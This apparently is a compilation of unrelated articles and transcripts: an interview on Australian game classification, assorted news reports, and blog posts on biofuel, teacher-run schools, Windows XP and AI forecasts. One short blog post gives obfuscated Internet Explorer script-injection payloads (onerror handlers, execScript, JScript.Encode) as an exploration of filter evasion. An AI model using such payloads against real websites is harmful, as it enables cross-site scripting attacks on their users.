Peter Mares :
So you agree that 15 year olds should n't be able to buy and play this game ?
David Doe : Absolutely .
Peter Mares :
Now how many games are entering Australia under an M.A. rating that you think should be actually 18 plus r-rated ?
David Doe :
Well if you look at the numbers from the BDFC , the SRB , Peggy and the New Zealand Office of Film and Literary Classification , in the last five years , we 've had 25 games come into Australia and be rated MA15 + , that have been rated R18 or the equivalent in those other areas .
Peter Mares :
And some of those games though are modified for the Australian audience I think , because of our different rating system .
David Doe :
That 's right .
Some of them have been modified .
I think around five or six of those games were modified to have an Australian version of the game .
Peter Mares :
And presumably the violence was toned down a bit , or the sex , or whatever it was .
David Doe :
Some of them have had the violence turned down , or even just the physics for the rag - dolling effect that some of these games contain .
Peter Mares :
What does that mean ?
David Doe :
That is when a body moves around , they have a whole very , very complex set of physics that instructs the body how to move in that environment , and sometimes that will be toned down in order to pass the MA15 -
Peter Mares :
So to make it less graphic , as it were ?
David Doe :
That 's right .
Peter Mares : OK .
Another game I 'm aware of is one called Fallout 3 .
Can you tell us a bit about that game ?
David Doe : Fallout 3 is in post - apocalyptic Washington after the nuclear bombs , and it is your role as the character , is to survive the wasteland of Washington D.C.
And it's a particularly graphic and violent videogame .
Peter Mares :
And is that available in Australia ?
David Doe :
That 's freely available under MA15 rating in Australia .
Peter Mares :
And should it be ?
David Doe :
It should be rated R . There 's no question about that .
Again , the European games information lobby the DDFC , Yes I do , which is the American lobby , have all rated this game for adults only , and we 've rated it MA15 +.
Peter Mares :
Well that would suggest that the Attorney - General from South Australia is right , and that the Classification Review Board is n't doing its job .
David Doe : I think the Classification Board is doing the best it can .
This is - there 's obviously a huge commercial interest in the videogame industry , and even though Australia is a small market , they 're going to try and provide Australians with the type of content that they would like to engage with .
So whether or not they 're trying to make sure that more games get through , at an MA15 + ( rating ) or not , I 'm not sure , I do n't work there , but I think if we gave them the option of having an R18 rating , they would classify more games as R18 because they have that ability and in that way people would be more informed as to the type of content that 's readily available in those types of games .
Peter Mares :
The Attorney - General though would argue they would also then allow more games into Australia that currently are n't allowed in at all .
David Doe :
Well he 's probably going to make that argument no matter what .
I would refute those claims , given that the classifications guidelines code explicitly deals with the type of things that Mr Atkinson was talking about , and that sexual violence and proscribed drug use , for example , are automatically refused classification .
Peter Mares :
But there are things now , games now that are refused classification in Australia , that is , they 're not allowed in because they can't be classified MA , they can't be classified Mature Adult for 15 year olds , and there 's no R rating , so they do n't get in .
Now some of those games would get in presumably , in future , and presumably that 's what gamers like you want , you want to have access to these games as well .
David Doe :
We want to give people the choice to choose , to give them the opportunity to choose for themselves what the type of content they engage with .
So if you 're over 18 years old , you should be able to decide for yourself what you think is appropriate .
If you 're a parent , you should be able to know the type of content that is involved in these games .
Whether or not I 'm going to play them , or lots of people are going to play them , that 's really up for the community to decide .
No - one 's going to sit down and force everybody to play these R18 rated games .
Peter Mares :
And you support those existing restrictions that would apply if we had an R rating , things like sexual violence , drug use ?
David Doe : Sexual violence , definitely .
Drug use is obviously one of the more tricky topics , because some drug use will go through , and some other drug use wo n't .
And that is a matter for the Classification Board .
Peter Mares :
There is also an ability as I understand it , on consoles , the game consoles , to lock out certain categories of games , so that if we had an R rating , you could organise your console at home so R rating games wo n't work .
Now is that an effective thing , or do kids just know how to get around of that sort of stuff ?
David Doe :
No , it 's absolutely an effective thing .
For the parents that know that their console has that functionality , it works .
The only way a child would be able to get around it is if the parent told them the password .
Every current generation console , x - box 360 , the PS 3 , the wii and even the PC to an extent , has the ability to restrict access to content based on the guidelines .
Peter Mares :
So that 's another level of control that could be operated if the R - because the Attorney - General 's argument was that if these games come in and these R- rated games are hanging around the house , then kids are going to use them .
David Doe :
Yes , that argument does n't really hold too much water when you look at the R rated DVDs that are freely available as well .
We want to give parents the opportunity to determine what they think is appropriate for their children , and by letting them know that they have these controls built in to all of the current generation consoles , there 's another platform that we need to talk about .
Peter Mares : Now , we also had a discussion with the Attorney - General about how much support there is for this point of view .
I quoted a survey , he pointed out that survey was funded by industry .
Do most Australians actually even think about these issues ?
David Doe : Most Australians
I think have played a video game at some point .
I would also argue that a lot of Australians just do n't know that we do n't have an R 18 rating for video games .
When you point it out , they invariably say ' Well why do n't we ? '
And then they support the inclusion of R18 rating , because it would reduce confusion at the counter when they 're buying it .
Peter Mares :
And you 're going to run a candidate in the South Australian State election on this issue .
You 're going to stand , well not you personally , but you 're looking for someone to stand against Michael Atkinson , as I understand it in the seat of Croydon .
Now this could be a big embarrassing if he 's proved correct and you get any votes , it 's going to actually support his view that your course does n't have any support and people want these games kept out altogether .
David Doe : I think there 's going to be a lot of different ways to interpret the election results on March 20th .
We 're definitely going to run a candidate in Croydon , and partially because of the intractability of the Attorney - General .
He has made it clear that he is immune to popular public support , scientific research and reasoned arguing .
So he has left us with no other alternative but to run a candidate against him in the seat of Croydon .
and as evidenced by his overly smug reference to 76 % of the two - party preferred vote at the last election , and a letter that he sent out to thousands of gamers around Australia saying ' Well if you do n't like it , run against me ' .
So here I am .
Peter Mares : David Doe , thank you very much for joining me .
David
Doe is an advocate of an R18 rating for games , he 's aiming to start a political party called Gamers4Croydon that will run in the South Australian election and challenge the Attorney - General , Michael Atkinson .
And we will see whether the Classification Board wants to respond to the South Australian Attorney - General 's comments on the way it classifies games on a future program .
In the meantime , give us your thoughts .

PANAMA CITY , Fla . ( AP ) 
A judge in Florida wants footage to be turned over to the court so he can decide on a motion to dismiss a civil suit against " Girls Gone Wild " founder Joe Francis U.S. District Judge Richard Smoak on Wednesday ordered all relevant videos be handed to him so he can make a final ruling on the motion by Francis ' lawyers .
Smoak said the motion relies on the plaintiff 's actions in the videos .
Four women filed suit last year .
They said they were 13 to 17 years old when they were filmed in stages of undress or engaged in sexual activity by Francis ' company , which produces the " Girls Gone Wild " video series .
The plaintiffs are now adults .
Francis ' motion argues the actions on film did not violate Florida law .
Trial is scheduled for February .

Nanofarming Offers a Kinder , Gentler Way to Get Biofuel from Algae
December 6th , 2009 by Tina Casey
One barrier to cost - competitive biofuel from algae is about to fall , and we may have nanofarming to thank for that .
The new technology uses tiny nanoparticles to absorb free fatty acids from living microalgae .
It is being developed by the U.S. Department of Energy ’s Ames National Laboratory and Iowa State University , in partnership with biofuel specialist Catilin , Inc .
[ social_buttons ]
In conventional biofuel production , algae are harvested and killed in order to extract their oil .
It ’s not a very efficient process — sort of like uprooting a tree and stripping off the apples to make cider .
By coaxing out the oil on a molecular level , nanofarming enables algae to give up their product while continuing to grow .
Add Catilin ’s non-toxic biofuel catalyst to the mix , and you have the makings of a more sustainable and cost - competitive biofuel – with some extra benefits , too .
Algae and Nanofarming
The tiny particles developed by Ames and Iowa state are described as surface - functionalized mesoporous nanoparticles , aka incredibly tiny sponges .
The research team headed by Dr. Victor Shang - Yi Lin has fine tuned both the surface and pores of the particles , to make them absorb the free fatty acids used in biofuel production .
Alage Biofuel and Non-Toxic Catalysts
Dr. Lin is also a principal in Catilin , Inc. , which has developed a non -toxic catalyst called T300 to convert the fatty acids to biofuel .
T300 is recyclable and it would replace the conventional biofuel catalyst sodium methylate , a salt that kills human nerve cells .
According to Catilin , T300 could shave up to 19 cents per gallon off the cost of conventional biodiesel production .
Algae Biofuel With Benefits
Biofuel production yields huge quantities of glycerin as a by - product , and Catilin claims that the glycerin byproduct of T300 is a high quality technical grade .
That could potentially add enormous value to algae biofuel production .
Currently , much crude glycerin is incinerated as waste , though some high grade glycerin is used in cosmetics , soaps , and other products .
That could be on the verge of changing , as researchers are developing more ways to recycle glycerin including hydrogen gas , cattle feed , non-toxic antifreeze , ethanol , methanol , and even a medium for growing more algae .

People are shocked by the manner of James Kazini 's death Uganda 's former army chief James Kazini has been killed at his girlfriend 's flat in the capital , Kampala .
A BBC correspondent says Maj Gen Kazini died after being hit on the head with an iron bar during a brawl .
An army spokesman said he had been a victim of domestic violence .
His girlfriend has been arrested .
He was sacked as army chief in 2003 after UN accusations that he plundered resources in the Democratic Republic of Congo when leading operations there .
He was in charge of Ugandan troops who clashed with their Rwandan counterparts in the eastern Congolese town of Kisangani in 1999 .
The BBC's Joshua Mmali in Kampala says many people are shocked by the manner of his death .
Last year he was found guilty of corruption - charges unconnected to the Congolese allegations .
He went to jail , but was out on bail and facing further charges of subversion at the time of his death .
Denials Allegations against Maj Gen Kazini were first made in two United Nations reports , at a time when Uganda had a heavy military presence in eastern DR Congo , supporting the rebellion against President Laurent Kabila and later against current President Joseph Kabila .
Although Maj Gen Kazini was withdrawn from DR Congo in 2001 , the Ugandan government protested his innocence and appointed him acting army chief .
The government nevertheless set up a judicial commission of inquiry into the UN allegations .
As a result of the inquiry , the government recommended that action be taken against Maj Gen Kazini , and he was removed from his post as acting head of the army in 2003 .
An army spokesman said at the time that Maj Gen Kazini 's removal from office was unconnected with the UN accusations , and that he was being sent for further training .
Last year he was found guilty of causing the army financial loss , charges that stemmed from irregularities in the army payroll .
He was most recently facing charges that he disobeyed a presidential order , when he was army chief , not to transport large numbers of troops at one time .
Such actions can raise suspicion of coup plotting , our reporter says .

Attacked daily as the biggest roadblock to improving public education , union teachers have their work cut out for them , both in the classroom and in the court of public opinion .
They responded this fall , opening their own schools in two cities .
“ Teachers have been getting the most blame and the most responsibility and the least amount of decision - making power , ” says Lori Nazareno , who leads a new teacher - run school in Denver .
Teachers in Boston have their own school , too , and educators in Los Angeles are pushing for community - centered models — all while a hurricane of teacher - bashing is pushed ahead by school privatizers , the press , and Obama administration policy .
TEACHERS RULE
Three grades of the Boston Teachers Union School opened up two months ago .
The young school , which will expand to K - 8 by 2012 , is part of the city ’s controversial pilot school program dating from 1994 .
The BTU , the school district , and the mayor initiated pilot schools in order to head off the rise of privately managed , publicly funded charter schools , which Massachusetts had approved earlier that year .
But the schools have been a point of contention ever since .
A years - long battle between union and district ended in 2006 when the union won more paid hours for teachers , and in turn agreed to approve seven more pilot schools — including a union - run school .
Before it was all over , though , the union had taken a beating in the local press .
“ They kept calling me an ogre standing in the way of progress , ” says Richard Stutman , BTU president .
The union now must prove that teachers can run a successful school — and one where work rules and quality education are n’t cast in opposition .
The school follows in the pilot school traditions of a longer school day and a less - scripted curriculum .
But unlike its fellow pilots , the BTU hires solely from inside the district and enrolls students randomly from its section of the city .
The school also pays teachers for working the longer day — a point of pride for the union .
The major difference at the BTU school is the lack of a principal .
Teacher - leaders run the show , making all long - term decisions by consensus .
“ Anything that does n’t have to be done today will be decided by a collective , ” says Stutman .
As for the union contract , teachers are in the bargaining unit and work under nearly the same contract , but have a different relationship to it .
After all , they ’re the boss — to a degree .
Standardized tests remain the rubric for success , as they do throughout the education system .
Stutman says the testing regime is easily manipulated by the city ’s charters — which tout higher scores than district high schools but cherry - pick students and have what he calls “ high eviction rates . ”
Elementary charter schools , which ca n’t select their students , show no improvement in scores over district schools .
Stutman says that because teachers have more creative control , the new school will rate highly by any measure .
But as its students enter grades that take state - administered standardized tests , the curriculum will inevitably bend toward test prep .
While Boston ’s teacher - leaders are n’t yet burning bubble sheets , the development of teacher - run institutions itself signals a seismic shift .
SMOOTH START IN THE ROCKIES
Union teachers are at the helm at Denver ’s Math and Science Leadership Academy .
Members of the Classroom Teachers Association ( a National Education Association affiliate ) jumped at the chance to run their own school when the city began taking proposals for new educational models three years ago .
After 19 years of teaching in Miami , Lori Nazareno moved to Denver and became the lead teacher at MSLA , an elementary school with 130 students , grades K - 2 .
SUPPORT LABOR NOTES BECOME A MONTHLY DONOR Give $ 10 a month or more and get our " Fight the Boss , Build the Union " T - shirt .
The school ’s 12 teachers sit on decision - making committees that develop curriculum , professional development plans , and a vision of the school ’s culture .
The two lead teachers still teach two hours a day .
“ We designed it , we put this together , and we ’re running it , ” says Nazareno .
“ Everybody gets that it ’s our responsibility . ”
The school draws students by lottery from a working - class neighborhood on Denver ’s southwest side , composed largely of first - generation Mexican , Somali , and Korean families .
Sixty percent of its students are English - language learners , and up to 90 percent receive reduced - fee lunches .
Though they ’ve maintained the district ’s curriculum for math , science , and literacy , MSLA teachers take different approaches to teaching .
For example , every Friday students undertake “ serv-ice learning ” projects that promote engagement with the community and teach skills through programs on renewable energy , hunger , and homelessness .
Teachers work under the local contract , but they waived provisions outlining a principal ’s powers .
At MSLA , educators assess each other .
And they ’ve already shown that schools in less affluent neighborhoods can attract good teachers with the promise of more ownership .
The school fielded around 30 applications for each position , and is already receiving dozens more for next year , when the academy adds a grade .
LA SCHOOLS IN THE BALANCE
In Los Angeles , the school board accepted bids in November for the management of 36 schools .
The schools include 12 existing sites deemed low - performing as well as 24 new ones set to open in the next year to relieve overcrowding .
Charter companies are in a frenzy to snap up the sites , but the teachers union , United Teachers Los Angeles , is organizing with teachers and parents to keep them at bay .
UTLA gathered teachers and parents ( and administrators ) of the low - performing schools at union headquarters .
There they wrote proposals for how they would transform their schools .
Superintendent Ramon Cortines will evaluate the proposals , consider teacher and parent votes at schools ( and student votes at high schools ) , and make a recommendation to the school board in January .
However , final decisions will be made in February by the charter - friendly school board that approved the school - bidding idea in the first place .
The process will repeat for the next several years , as 300 LA schools come in for some form of shake - up .
Teams of union reps are trying to seize that opening to develop proposals with each school ’s community .
Though there ’s no talk of a UTLA - run school yet , the union is pushing for greater autonomy for teachers and parents .
The union already has collaborated with the district on a variety of “ alternative ” schools that allow greater local control over a school ’s curriculum , budget , and staffing .
“ Parents are getting active , and it ’s not just the union talking to parents , it ’s parents organizing with each other , ” says Ingrid Villeda , a UTLA rep working on proposals .
Teams of parents are going door to door to build support for a community - centered model .
OBAMA CRACKS THE WHIP
While teacher - run schools make strides in autonomy , creativity , and collective decision - making , they have n’t yet found a way to determine their own measures of success — a struggle that will continue during President Obama ’s tenure .
The U.S. Department of Education released final rules in November for the contest over $ 4.5 billion in federal education aid .
The money rewards states and districts that tie teacher evaluations and pay to student performance on standardized tests .
While Education Secretary Arne Duncan recently toned down his teacher - bashing , the White House ’s rules are no friendlier .
Obama ’s “ Race to the Top ” program requires districts to close low - performing schools , many of which will reopen after firing and replacing the entire teaching staff .
Spending by the Metropolitan Police on air travel has risen by more than a third in a year , with the amount spent on business class tickets alone exceeding the cost of all flights in the previous two years .
Figures obtained by The Independent show that Britain 's biggest police force spent £ 6.2 m on flights in the most recent financial year , a 35 per cent increase on the £ 4.6 m spent on air travel in 2007/08 and 06/07 .
Of the £ 6.2 m , £ 4.7 m was spent on business class flights .
The figures have brought criticism from members of the Metropolitan Police Authority ( MPA ) who have queried why , in the midst of a recession and with a shrinking budget , Scotland Yard has increased its own costs by voluntarily paying for more expensive air fares .
Download the new Independent Premium app Sharing the full story , not just the headlines
The total figure , released under the Freedom of Information Act , covers the cost of 6,316 trips made by Metropolitan Police officers and staff last year .
Of that number , 2,246 trips – 35 per cent – were taken in business class .
Those flights totalled £ 4.7 m , meaning that officers within the Met took the equivalent of six business class flights every day last year at an average cost of £ 2,090 per ticket .
The force has stressed that the number of business class flights is relatively low compared with the 4,070 taken in economy class last year .
But the business class tickets accounted for 74 per cent of the overall air travel costs while the economy tickets , costing a total of £ 1.5 m – an average of £ 368 each – made up just 26 per cent of the total spend , despite accounting for 65 per cent of the trips .
Jenny Jones , the Green Party member of the Metropolitan Police Authority , said : " For me there are two issues here : first of all we need to ask if all of these flights are actually necessary or if the Met should be looking at cutting the number of flights they are taking .
Secondly , when the budget is in such dire straits , they should be looking to cut superfluous costs such as business class seats , when economy ones will do . "
Examples of recent flights taken by the Met include a trip last month by Sir Paul Stephenson , who visited police officers in India .
Most memorably , John Yates , the assistant commissioner is charge of counter - terrorism , was dispatched to Brazil in 2005 to apologise to the family of Jean Charles de Menezes after the electrician was wrongly shot dead by Scotland Yard officers on a Tube train .
But figures obtained by this newspaper also show that a large amount of the force 's flying is done within the UK .
Of the 6,316 flights taken in 08/09 , 1,958 – five a day – were UK domestic flights .
This has prompted outrage from environmentalists who are angry at the number of flights taken by the force from one British airport to another .
Leo Murray , a spokesman for the campaign group Plane Stupid , said : " It is a mystery why any police force should be taking any domestic flights at all .
But a single police force suddenly deciding to spend taxpayers ' money taking five flights every day is a kick in the teeth for all of us doing our best to reduce our carbon footprints .
Domestic flights are driving expansion by clogging up our airports , yet the vast majority are totally unnecessary .
Has n't the Met heard of teleconferencing ? "

The number of UK internal flights is higher than the 1,645 taken in 2007 / 08 , a number which included 11 flights to Southampton , 90 miles from London , and 496 flights to Edinburgh .
Ms Jones added : " I have repeatedly said that the Met has got to reduce the number of internal flights in Britain , partly because of the environmental issues , but also because of the cost .
They really should be using the train for business trips within the UK .
At a time when the budget is stretched , the Met has to start acting responsibly . "
A spokeswoman for the Metropolitan Police said that the reason for the increase in the amount spent on flights was " investigation and security work " .
She added : " In all instances , the most economical fare is purchased that meets the needs of the traveller and the reason for the visit .
" Authorisation for all overseas trips is made by an officer of at least ACPO Commander rank or a senior member of police staff in overall charge of a business area .
Every trip requires a strong business case and the authorising officer determines what class of ticket needs to be purchased .
" We have a number of deals with airlines to help drive down costs .
The Metropolitan Police always seeks to book the cheapest flights available bearing in mind operational demands .
" Almost three - quarters of all flights taken last year were economy class .
The default position for all staff and officers is economy except where security , operational or protection requirements apply . "
Most of us will know Meiji Chocolate from the chocolate bars you can buy in the convenience stores .
Meiji have chocolate makers for a long time , but recently opened a chocolate cafe and started a range of boutique chocolates .
They call the brand 56 Chocolates .
The cafe is located at Shinbashi and serves 100 % chocolate all day long .
Some of the flavors here are very original .
Wasanbon is traditionally used in Japanese sweets not chocolate .
Lemon salt , honey , black pepper , jasmine , rose hip , red chilli , soy milk , basil , lavender are just some of the more interesting ones to try .
What ’s your favorite chocolate ?
Are you a Meiji chocolate fan ?

Reuters ' Christiania correspondent says the Storthing has conferred the Nobel Peace Prize on President Roosevelt .
" The Prize was received by Mr. Peirce , the American Minister , in the Storthing , at half - past one this afternoon .
The members of the Nobel Prize Committee were seated in front of Ministers .
At the invitations of the President of the Storthing and the President of the Prize Committee , Mr Lövland , Minister of Foreign Affairs , announced that the Peace Prize had been awarded to President Roosevelt , who had authorised the American Minister to receive it .
" The President of the Storthing , M. Gunnar Knudsen , in a short speech , recalled the fact that the Norwegian Storthing was the first national assembly to adopt the cause of peace , which was now no longer a Utopia .
It was 12 or 15 years ago that the leading statesmen of the world and even the chiefs of States had taken up the cause .
The United States had entered the front rank among the advocates of peace , and what had especially awakened the attention of the world was the work of President Roosevelt in ending the bloody war between Russia and Japan .
" In handing the prize to the American Minister , the President asked him to take Mr. Roosevelt a greeting from the Norwegian people , and expressed the wish that Mr. Roosevelt might be able to do further work for the cause of peace in the future .
" Mr. Peirce , in thanking the Storthing for the award , said that any words of his were inadequate to express his deep emotion in receiving this distinguished testimony on behalf of President Roosevelt .
He then read a message from President Roosevelt expressing deep thanks for the prize , and declaring that there was no gift he could appreciate more .
The President adds that he has decided to use the prize to establish at Washington a permanent Industrial Peace Committee , a righteous peace in the industrial world being as important as in the world of nations . "
Distribution of Nobel Prizes
The formal distribution of the Nobel Prizes took place yesterday evening at Stockholm .
Each prize this year amounts to £ 7,650 .
Professor Thomson 's prize was awarded to him for his researches , extending over many years , into electrical matters , and Professor Moissan 's for his experiments in the isolation of fluorine , his researches regarding the nature of that element , and for the application of the electric furnace to the services of science .
Professors Ramon y Cajal and Golgi are bracketed for the medicine prize on account of their works dealing with the anatomy of the nervous system .
( CNN ) -- Rapper T.I. was released from prison on Tuesday after seven months , his attorney confirmed .
The performer , whose real name is Clifford Harris Jr. , will serve the remainder of a reduced sentence in a correctional center near Fulton County Airport in Atlanta , Georgia .
Harris was sentenced to a year and a day in March 2009 resulting from weapons charges related to purchasing machine guns and silencers .
Officials charged him with providing a bodyguard with $ 12,000 to buy weapons .
In May , he reported to a federal prison complex in Forrest City , Arkansas , to begin serving his sentence .
In addition to serving prison time , T.I. was placed on house arrest , given community service and was ordered to pay a $ 100,300 fine .
It was not the first time the platinum - selling artist had been in trouble with the law .
Harris was not permitted to own any guns because he had been convicted in 1998 on felony drug charges , possession of crack cocaine with intent to distribute , in Cobb County in suburban Atlanta .
After the rapper 's arrest , he entered a plea agreement , which federal authorities called unique because it allowed him to remain out of prison for a year while he performed .
Steve Sadow , Harris ' attorney , said prisoners with Harris ' sentence are eligible for a 54 - day sentence reduction for good behavior .
Harris is expected to remain at the halfway house for three months and will still be required to finish serving slightly less than 500 hours of community service and about 23 days of home incarceration .
Before reporting to prison , Harris threw himself a going - away party / concert attended by thousands at Philips Arena in Atlanta .
This is a fun post about a feature I found in IE that allows you to do some crazy obfuscation .
I ’ll start off with some simple examples :-
<img src=1 language=vbs onerror=msgbox+1 > < img src=1 language=vbscript onerror=msgbox+1 > < img src=1 onerror=vbs:msgbox+1 >
So here we ’re not obfuscating but I ’m showing how IE accepts the language attribute and a labelled vbs statement to change the event to allow vbscript instead of javascript .
Ok so lets play a little ping pong :-
execScript ( " MsgBox 1 " , " vbscript " ) ; //executes vbs from js execScript ( ' execScript " alert ( 1 ) " , " javascript " ' , " vbscript " ) ;
Look how we can call vbscript from javascript by using execScript and then look how we can execute from javascript to vbscript and then back to javascript again !
So now we ’re playing some ping pong but how can we make our little game hidden ?
< a href= # language = " JScript.
Encode " onclick= " #@~ ^CAAAAA==C^+.D`8#mgIAAA==^#~@"
>test</a>
Wait what ?
Yeah IE supports jscript.encode within the language attribute .
Remember jscript.encode ?
ah the old ones are the best 🙂
That ’s it right ?
Well ….
< iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
Yeah you can use VBScript .
Encode and Javascript .
Encode as labels within an event !
You might be going WTF right now and I can understand it because I did exactly the same but it would be silly to finish now without finishing our game of ping pong .
How many rallies shall I do ?
I think 3 should be enough … .
< body onload=" jscript.encode:#@~^TAAAAA==nX+^UmMkwD`r:@$?73hzb ) ) {'Z%QRG=2 V7WB qdG\:2jbebz ) '{7:=@$J~E%km.kaOc+U1W9+J*CRcAAA==^#~@ " >

For all the stories about enterprises holding off on Windows 7 deployments , Windows XP 's dominance in the enterprise is at the beginning of the end , says one industry analyst .
This will not happen overnight , writes Forrester analyst Benjamin Gray in a new research report , but there are enough reasons for IT managers to " shake the status quo , and finally end Windows XP 's corporate reign . "
XP , now an eight - year - old OS , " has delivered the compatibility , security , and reliability that firms had hoped for and to this day remains the desktop standard for most businesses and government agencies , " Gray writes .
[[ Windows 7 Bible : Your Complete Guide to the Next Version of Windows ] ]
Indeed , Windows XP still powers almost 80 percent of commercial PCs , according to a survey of 665 IT decision - makers that was part of the Forrester report entitled " Windows 7 Commercial Adoption Outlook . "
Nevertheless , many factors point to XP 's demise .
Two - thirds ( 66 percent ) of the 655 surveyed IT decision - makers from North American and European enterprises and SMBs are planning to migrate to Windows 7 eventually , although most do n't have firm plans yet .
Additionally , the research shows that 51 percent of respondents plan to have Windows 7 as the primary OS on their PCs within 12 months .
Forrester also urges that companies should prepare for employee requests for Windows 7 as it becomes more popular with consumers .
Here are five other key factors that Forrester believes will loosen Windows XP 's grip on the enterprise and make way for Windows 7 .
Businesses Are Supporting Old Infrastructure
Forrester 's Gray writes that because of the recession , IT managers needed to lower costs by extending the life of existing desktops and laptops .
Many also held off on hardware upgrades because they wanted them to coincide with a Windows 7 deployment .
For global companies that support thousands of apps , compatibility testing can take up to 18 months .
So if they 've been testing in anticipation of Windows 7's release , full deployments will conclude by the end of 2010 .
Windows XP Support Is Waning
Since April of this year , Windows XP SP2 has been in the extended support stage , which means support is no longer free and only includes security updates and patches .
Next July , XP SP3 will enter extended support as well .
All support for Windows XP SP2 and SP3 will end in April 2014 .
Windows XP Availability Will Get Pinched
The ability to buy Windows XP machines will change after Windows 7 becomes generally available this week , Gray writes .
With the release of Windows 7 's first service pack , scheduled to be a year or so after its initial release , OEM licenses bundled with every PC will no longer have downgrade rights to XP .
This means that to deploy Windows XP on a new PC , companies will have to purchase volume license copies of Windows along with the new PCs or use existing , unused Windows volume licenses .
Business Reasons Encourage Upgrade to Windows 7
Forrester has found that the enterprise features in Windows 7 will help companies improve networking and security and ultimately cut costs .
Some features that Forrester recommends IT departments prepare for include :
DirectAccess , which lets remote workers connect to corporate networks without the use of a VPN ; BranchCache , which speeds up access to networks in remote offices that are away from corporate headquarters ; BitLocker To Go , an extension of the BitLocker hard - drive encryption feature introduced in Vista that will now protect removable devices like external hard drives and USB thumb drives ; AppLocker , which aims to protect users from running unauthorized software ; and federated search , which promises to simplify access to data across local and remote networks .
Improved Client Virtualization Can Accelerate Deployment Plans
Windows 7 ships with Windows Virtual PC and Windows XP Mode , which provide the ability to run apps not yet compatible with Windows 7 in an XP - compatible virtual machine .
Moreover , customers with software assurance agreements can use MDOP ( Microsoft Desktop Optimization Pack ) , a subscription - based suite of apps that includes virtualization technologies allowing IT pros to deploy and manage virtual images , " thus removing the last barriers to deploy Windows 7 , " writes Gray .

This story , " Five Reasons Windows XP Has About a Year to Live " was originally published by CIO .
( CNN ) -- Authorities have officially dropped all charges against an American who tried to snatch back his children from his ex-wife in Japan , the Fukuoka prosecutor 's office said Thursday .
Charges had been technically " on hold " since Christopher Savoie was released from jail in October , though legal experts had said the move essentially meant the charges had already been dropped .
The prosecutor 's office said at the time that Savoie was released after he promised not to take his children back to the United States " in this manner . "
It was not clear whether he had a chance to see his children after his release .
Savoie , 38 , a Tennessee native and naturalized Japanese citizen , allegedly abducted his children -- 8 - year - old Isaac and 6 - year - old Rebecca -- as his ex-wife walked them to school on September 28 in Yanagawa .
With the children , Savoie headed for the nearest U.S. consulate in Fukuoka to try to obtain passports for them .
Screaming at guards to let him in the compound , Savoie was steps from the front gate but still standing on Japanese soil when he was arrested .
Savoie and his first wife , Noriko Savoie , were married for 14 years before a bitter divorce in January .
The couple had lived in Japan , but moved to the United States before the divorce .
Noriko Savoie received custody of the children and agreed to remain in the United States .
Christopher Savoie had visitation rights .
On the day that the children were to start school in August , Savoie learned that his ex-wife had fled with them to Japan .
Savoie later filed for and received full custody of the children , and police in Franklin , Tennessee , issued an arrest warrant for his ex-wife .
But Japan is not a party to the 1980 Hague convention on international child abduction -- though the government has expressed interest in reconsidering -- so the warrant was not recognized by Tokyo .
Japanese law follows a tradition of sole - custody divorces .
When a couple splits , one parent typically makes a complete and lifelong break from the children .
Complicating the matter is the fact that the couple is still considered married in Japan , because they never divorced there , police said .
The children also hold Japanese passports , Japanese authorities have said .
Foreign parents have had little luck in regaining custody , the U.S. State Department said .
Savoie 's current wife , Amy , said in October that her family has been ripped apart .
" Isaac and Rebecca had a very , very happy situation here in Tennessee , " she said .
" They have people who love them here . "
She said she did not think the parties could work out an agreeable arrangement regarding the children .
" There are two parents who love these children and one of them has just been -- just cast aside . "

Am I the only one who , upon hearing the year 2010 , imagines some date far off in the future ?
I think I felt the same way in the weeks before 2000 , so I ’m sure it will pass .
Anyway , another year has gone , indeed another decade , and it ’s time for my annual review of predictions .
You can find my last annual post here .
It ’s been an interesting year in which I ’ve been exposed to far more neuroscience than ever before .
What I ’ve learnt , plus other news I ’ve absorbed during the year , has helped to clarify my thinking on the future of AI .
First , let ’s begin with computer power .
I recently gave a talk at the Gatsby Unit on the singularity in which I used the following graph showing the estimated LINPACK scores of the fastest computers over the last 50 years .
The first two points beyond 2010 are for some supercomputers that are already partly constructed .
In the past performance estimates for these kinds of machines near to their delivery have been reasonably accurate so I ’ve put these on the graph .
Rather more speculative is the 2019 data point for the first ExaFLOPS machine .
IBM is in discussions about how to put this machine together based on the technology used in the 20 PetaFLOPS machine due in a year and a bit .
Based on articles on supercomputer sites like top 500 , it appears to be a fairly mainstream opinion that this target should be achievable .
Nevertheless , 9 years is a while away so I ’ve marked it in grey .
First observation : just like the people who told me in 1990 that exponential growth in supercomputer power could n’t continue for another decade , the people who told me this in 2000 were again completely wrong .
Ha ha , told you so !
So let me make another prediction : for the next decade this pattern will once again roughly hold , taking us to about 10 ^18 FLOPS by 2020 .
Second observation : I ’ve always been a bit sceptical of Kurzweil ’s claim that computer power growth was double exponential , but I ’m now thinking that there is some evidence for this having spent some time putting together data for this graph and attempting to compensate for changes in measurement etc. in the data .
That said , I think it ’s unlikely to remain double exponential much longer .
Third observation : it looks like we ’re heading towards 10^20 FLOPS before 2030 , even if things slow down a bit from 2020 onwards .
That ’s just plain nuts .
Let me try to explain just how nuts : 10^20 is about the number of neurons in all human brains combined .
It is also about the estimated number of grains of sand on all the beaches in the world .
That ’s a truly insane number of calculations in 1 second .
Desktop performance is also continuing this trend .
I recently saw that a PC with just two high end graphics cards is around 10^13 FLOPS of SGEMM performance .
I also read a paper recently showing that less powerful versions of these cards lead to around 100x performance increases over CPU computation when learning large deep belief networks .
By the way , in case you think the brain is doing weird quantum voodoo : I had a chat to a quantum physicist here at UCL about the recent claims that there is some evidence for this .
He ’d gone through the papers making these claims with some interest as they touch on topics close to his area of research .
His conclusion was that it ’s a lot of bull as they make assumptions ( not backed up with new evidence ) in their analysis that essentially everybody in the field believes to be false , among other problems .
Conclusion : computer power is unlikely to be the issue anymore in terms of AGI being possible .
The main question is whether we can find the right algorithms .
Of course , with more computer power we have a more powerful tool with which to hunt for the right algorithms and it also allows any algorithms we find to be less efficient .
Thus growth in computer power will continue to be an important factor .
Having dealt with computation , now we get to the algorithm side of things .
One of the big things influencing me this year has been learning about how much we understand about how the brain works , in particular , how much we know that should be of interest to AGI designers .
I wo n’t get into it all here , but suffice to say that just a brief outline of all this information would be a 20 page journal paper ( there is currently a suggestion that I write such a paper next year with some Gatsby Unit neuroscientists , but for the time being I ’ve got too many other things to attend to ) .
At a high level what we are seeing in the brain is a fairly sensible looking AGI design .
You ’ve got hierarchical temporal abstraction formed for perception and action combined with more precise timing motor control , with an underlying system for reinforcement learning .
The reinforcement learning system is essentially a type of temporal difference learning though unfortunately at the moment there is evidence in favour of actor - critic , Q- learning and also Sarsa type mechanisms — this picture should clear up in the next year or so .
